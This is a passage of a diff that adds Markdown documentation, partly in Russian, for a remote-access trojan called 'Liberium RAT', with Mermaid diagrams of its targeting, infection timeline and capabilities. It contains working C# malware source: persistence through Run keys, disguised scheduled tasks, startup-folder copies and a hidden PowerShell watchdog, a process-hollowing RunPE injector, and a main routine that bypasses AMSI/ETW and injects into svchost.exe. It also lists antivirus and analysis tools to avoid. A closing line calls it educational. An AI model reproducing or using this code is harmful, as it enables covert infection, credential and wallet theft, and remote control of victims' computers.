+        D --> G
+        D --> H
+    end
+
+    subgraph "🥈 TIER 2 TARGETS (Medium Priority)"
+        I[💻 notepad.exe<br/>Text editor]
+        J[🎨 mspaint.exe<br/>Paint application]
+        K[📊 calc.exe<br/>Calculator]
+        L[🎵 wmplayer.exe<br/>Media Player]
+
+        D --> I
+        D --> J
+        D --> K
+        D --> L
+    end
+
+    subgraph "🥉 TIER 3 TARGETS (Low Priority)"
+        M[🌐 chrome.exe<br/>Google Chrome]
+        N[🦊 firefox.exe<br/>Mozilla Firefox]
+        O[📝 winword.exe<br/>Microsoft Word]
+        P[📊 excel.exe<br/>Microsoft Excel]
+
+        D --> M
+        D --> N
+        D --> O
+        D --> P
+    end
+
+    subgraph "🚫 BLACKLISTED TARGETS"
+        Q[🛡️ Antivirus processes<br/>avp.exe, mbam.exe]
+        R[🔍 Analysis tools<br/>procmon.exe, wireshark.exe]
+        S[🖥️ System critical<br/>csrss.exe, smss.exe]
+        T[🔒 Protected processes<br/>lsass.exe, services.exe]
+    end
+
+    subgraph "🎮 INJECTION STRATEGIES"
+        U[💀 Classic RunPE<br/>Full process hollowing]
+        V[💉 DLL Injection<br/>LoadLibrary method]
+        W[🧬 Manual Mapping<br/>Reflective loading]
+        X[🔄 Thread Hijacking<br/>Context manipulation]
+
+        E --> U
+        F --> U
+        I --> V
+        M --> W
+        N --> X
+    end
+
+    %% Styling
+    classDef selectionStyle fill:#74b9ff,stroke:#0984e3,stroke-width:3px,color:#fff
+    classDef tier1Style fill:#00b894,stroke:#00a085,stroke-width:3px,color:#fff
+    classDef tier2Style fill:#fdcb6e,stroke:#e17055,stroke-width:3px,color:#2d3436
+    classDef tier3Style fill:#fd79a8,stroke:#e84393,stroke-width:3px,color:#fff
+    classDef blacklistStyle fill:#ff6b6b,stroke:#d63031,stroke-width:3px,color:#fff
+    classDef strategyStyle fill:#a29bfe,stroke:#6c5ce7,stroke-width:3px,color:#fff
+
+    class A,B,C,D selectionStyle
+    class E,F,G,H tier1Style
+    class I,J,K,L tier2Style
+    class M,N,O,P tier3Style
+    class Q,R,S,T blacklistStyle
+    class U,V,W,X strategyStyle
+```
+
+### 🔥 **TIMELINE ПОЛНОГО ВТОРЖЕНИЯ**
+
+```mermaid
+gantt
+    title 🔥 LIBERIUM RAT - ПОЛНАЯ СХЕМА ВТОРЖЕНИЯ
+    dateFormat X
+    axisFormat %s
+
+    section 🎯 INITIAL INFECTION
+    Malware Execution          :done, infection, 0, 2s
+    Environment Check          :done, envcheck, after infection, 3s
+    Security Bypass            :done, bypass, after envcheck, 2s
+
+    section 🚀 SYSTEM INFILTRATION
+    File Placement             :done, placement, after bypass, 3s
+    Privilege Escalation       :done, privesc, after placement, 4s
+    Process Masking            :done, masking, after privesc, 2s
+
+    section 🦠 PERSISTENCE SETUP
+    Registry Keys              :done, registry, after masking, 2s
+    Scheduled Tasks            :done, tasks, after masking, 3s
+    Windows Service            :done, service, after masking, 4s
+    Startup Folder             :done, startup, after masking, 1s
+    AppInit DLLs               :done, appinit, after masking, 3s
+    Watchdog Process           :done, watchdog, after masking, 2s
+
+    section 🧬 RUNPE INJECTION
+    Target Selection           :done, target, after service, 2s
+    Process Creation           :done, create, after target, 1s
+    Memory Hollowing           :done, hollow, after create, 2s
+    Payload Injection          :done, inject, after hollow, 3s
+    Thread Resume              :done, resume, after inject, 1s
+
+    section 🌐 C&C CONNECTION
+    SSL Setup                  :done, ssl, after resume, 2s
+    Server Contact             :done, contact, after ssl, 3s
+    Bot Registration           :done, register, after contact, 2s
+    Plugin Loading             :done, plugins, after register, 4s
+
+    section 💰 PAYLOAD EXECUTION
+    Data Theft                 :active, theft, after plugins, 10s
+    Crypto Mining              :active, mining, after plugins, 20s
+    Network Spread             :active, spread, after plugins, 15s
+    Remote Control             :active, control, after plugins, 30s
+```
+
+### 💻 **РЕАЛЬНЫЙ КОД PERSISTENCE + RUNPE**
+
+#### 🔥 **Install.cs - Persistence Implementation**
+```csharp
+public static class Install
+{
+    public static void Run()
+    {
+        try
+        {
+            // 1. REGISTRY PERSISTENCE
+            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(
+                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            regKey?.SetValue("WindowsUpdate",
+                Process.GetCurrentProcess().MainModule.FileName);
+
+            // 2. SCHEDULED TASK PERSISTENCE
+            string taskName = "MicrosoftEdgeUpdateTask" + new Random().Next(1000, 9999);
+            Schtasks(Process.GetCurrentProcess().MainModule.FileName, taskName, 5);
+
+            // 3. SERVICE PERSISTENCE
+            if (Methods.IsAdmin())
+            {
+                AddRootkit(Process.GetCurrentProcess().MainModule.FileName);
+            }
+
+            // 4. STARTUP FOLDER PERSISTENCE
+            string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            File.Copy(Process.GetCurrentProcess().MainModule.FileName,
+                     Path.Combine(startupPath, "WindowsActivate.exe"), true);
+
+            // 5. WATCHDOG PERSISTENCE
+            StartWatchdog();
+
+        }
+        catch (Exception ex)
+        {
+            // Скрываем ошибки для stealth
+        }
+    }
+
+    public static void Schtasks(string path, string name, int minutes)
+    {
+        try
+        {
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = $"/create /tn \"{name}\" /tr \"{path}\" /sc minute /mo {minutes} /f",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true
+            });
+        }
+        catch { }
+    }
+
+    public static void StartWatchdog()
+    {
+        try
+        {
+            string watchdogCode = $@"
+                while($true) {{
+                    Start-Sleep -Seconds 30
+                    if(!(Get-Process -Name '{Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)}' -ErrorAction SilentlyContinue)) {{
+                        Start-Process '{Process.GetCurrentProcess().MainModule.FileName}'
+                    }}
+                }}";
+
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = "powershell",
+                Arguments = $"-WindowStyle Hidden -Command \"{watchdogCode}\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true
+            });
+        }
+        catch { }
+    }
+}
+```
+
+#### 🧬 **RunPE.cs - Process Hollowing Implementation**
+```csharp
+public static class RunPE
+{
+    [DllImport("kernel32.dll")]
+    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
+        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
+        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("ntdll.dll")]
+    static extern int ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+        byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+
+    [DllImport("kernel32.dll")]
+    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
+
+    [DllImport("kernel32.dll")]
+    static extern uint ResumeThread(IntPtr hThread);
+
+    public static bool Execute(byte[] payload, string targetProcess)
+    {
+        try
+        {
+            // ЭТАП 1: Создаем процесс в suspended режиме
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi;
+
+            if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero,
+                              false, 0x4, IntPtr.Zero, null, ref si, out pi))
+                return false;
+
+            // ЭТАП 2: Получаем контекст потока
+            CONTEXT context = new CONTEXT();
+            context.ContextFlags = 0x10007; // CONTEXT_FULL
+
+            if (!GetThreadContext(pi.hThread, ref context))
+                return false;
+
+            // ЭТАП 3: Читаем ImageBase из PEB
+            byte[] pebData = new byte[8];
+            ReadProcessMemory(pi.hProcess, (IntPtr)(context.Ebx + 8), pebData, 8, out _);
+            IntPtr imageBase = (IntPtr)BitConverter.ToInt32(pebData, 0);
+
+            // ЭТАП 4: Размапливаем оригинальный образ
+            ZwUnmapViewOfSection(pi.hProcess, imageBase);
+
+            // ЭТАП 5: Выделяем новую память
+            IntPtr newBase = VirtualAllocEx(pi.hProcess, imageBase, (uint)payload.Length,
+                                           0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+
+            // ЭТАП 6: Записываем payload
+            if (!WriteProcessMemory(pi.hProcess, newBase, payload, payload.Length, out _))
+                return false;
+
+            // ЭТАП 7: Обновляем PEB с новым ImageBase
+            byte[] newImageBase = BitConverter.GetBytes((int)newBase);
+            WriteProcessMemory(pi.hProcess, (IntPtr)(context.Ebx + 8), newImageBase, 4, out _);
+
+            // ЭТАП 8: Устанавливаем новый entry point
+            context.Eax = (uint)(newBase.ToInt32() + GetEntryPoint(payload));
+            SetThreadContext(pi.hThread, ref context);
+
+            // ЭТАП 9: Запускаем процесс
+            ResumeThread(pi.hThread);
+
+            return true;
+        }
+        catch (Exception ex)
+        {
+            return false;
+        }
+    }
+
+    private static uint GetEntryPoint(byte[] payload)
+    {
+        // Парсим PE заголовок для получения AddressOfEntryPoint
+        int peOffset = BitConverter.ToInt32(payload, 0x3C);
+        return BitConverter.ToUInt32(payload, peOffset + 0x28);
+    }
+}
+```
+
+#### 🎯 **Program.cs - Main Execution Flow**
+```csharp
+static void Main(string[] args)
+{
+    try
+    {
+        // 1. ПРОВЕРКА МЬЮТЕКСА (избегаем дублирования)
+        if (!MutexControl.CreateMutex(Config.Mutex))
+            return;
+
+        // 2. ОБХОД ЗАЩИТЫ
+        AsmiAndETW.Bypass();
+
+        // 3. УСТАНОВКА PERSISTENCE (если нужно)
+        if (Config.Install == EncryptString.Decode("true"))
+        {
+            Install.Run(); // Устанавливаем ВСЕ методы persistence
+        }
+
+        // 4. RUNPE INJECTION для скрытности
+        if (Config.UseRunPE == EncryptString.Decode("true"))
+        {
+            byte[] currentPayload = File.ReadAllBytes(
+                Process.GetCurrentProcess().MainModule.FileName);
+
+            // Инъекция в svchost.exe для максимальной скрытности
+            RunPE.Execute(currentPayload, @"C:\Windows\System32\svchost.exe");
+            return; // Завершаем оригинальный процесс
+        }
+
+        // 5. ОСНОВНАЯ ЛОГИКА RAT
+        Client.Run(); // Подключение к C&C серверу
+    }
+    catch (Exception ex)
+    {
+        // Скрываем все ошибки
+    }
+}
+```
+
+### 🔥 **ИТОГОВАЯ СХЕМА: ОТ ЗАРАЖЕНИЯ ДО КОНТРОЛЯ**
+
+```mermaid
+mindmap
+  root((🔥 LIBERIUM RAT<br/>COMPLETE TAKEOVER))
+    🎯 INFECTION VECTOR
+      📧 Email Attachment
+      🌐 Drive-by Download
+      💾 USB Propagation
+      🦠 Network Worm
+    🚀 INITIAL EXECUTION
+      🔍 Environment Check
+        VM Detection
+        Sandbox Evasion
+        Analysis Tools
+      🛡️ Security Bypass
+        AMSI Patching
+        ETW Bypass
+        UAC Bypass
+      ⚙️ Configuration
+        C&C Servers
+        Install Settings
+        Mutex Creation
+    🦠 PERSISTENCE LAYER
+      📝 Registry Keys
+        HKCU Run
+        HKLM Run
+        Legitimate Names
+      ⏰ Scheduled Tasks
+        Every 5 minutes
+        Random Names
+        System Level
+      🔧 Windows Service
+        Auto Start
+        System Service
+        Hidden Process
+      📂 Startup Folder
+        User Autostart
+        Hidden Files
+        Fake Names
+      🕷️ AppInit DLLs
+        Global Injection
+        Every Process
+        Deep Integration
+      👁️ Watchdog System
+        Process Monitor
+        Auto Recovery
+        Cross Protection
+    🧬 RUNPE INJECTION
+      🎯 Target Selection
+        svchost.exe
+        explorer.exe
+        Legitimate Processes
+      💀 Process Hollowing
+        CREATE_SUSPENDED
+        ZwUnmapViewOfSection
+        Memory Injection
+        Thread Resume
+      🎭 Stealth Execution
+        Legitimate Process Name
+        Hidden Malicious Code
+        System-level Access
+    🌐 C&C COMMUNICATION
+      🔒 SSL/TLS Encryption
+      📡 Multiple Servers
+      🆔 Bot Registration
+      🔧 Plugin Loading
+    💰 PAYLOAD EXECUTION
+      💎 Data Theft
+        Browser Credentials
+        Crypto Wallets
+        Personal Files
+      ⛏️ Cryptocurrency Mining
+        Hidden Processes
+        Resource Optimization
+        Pool Management
+      🦠 Network Propagation
+        SMB Exploitation
+        USB Spreading
+        Lateral Movement
+      🎮 Remote Control
+        HVNC Desktop
+        File Management
+        System Control
+```
+
+*⚠️ This documentation is for educational and research purposes only. The analyzed system demonstrates sophisticated malware techniques that should be studied to improve cybersecurity defenses.*
